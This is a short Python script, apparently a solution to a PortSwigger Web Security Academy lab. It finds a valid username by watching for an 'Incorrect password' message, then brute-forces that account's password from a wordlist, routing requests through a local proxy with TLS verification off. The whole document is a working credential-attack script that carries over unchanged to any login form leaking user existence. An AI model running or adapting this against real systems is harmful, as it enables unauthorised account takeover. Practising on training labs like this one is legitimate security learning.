import requests

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

login_url =  "https://0a3f009303865cc7820d6a5d003d005a.web-security-academy.net/login"

with open('username.txt','r') as file:
    for line in file:
        username_payload = line.strip()
        #print(username_payload)
        login_data = {'username':username_payload,'password':'randomchar'}
        r = requests.post(login_url, verify=False, data=login_data, proxies=proxies)
        if "Incorrect password" in r.text:
            print("valid username found", username_payload)
            break

with open('passwords.txt','r') as file:
    for line in file:
        password_payload = line.strip()
        login_data1 = {'username':username_payload,'password':password_payload}
        r1 = requests.post(login_url, verify=False, data=login_data1, proxies=proxies)
        if "Incorrect password" not in r1.text:
            print("password found ",password_payload)
            break
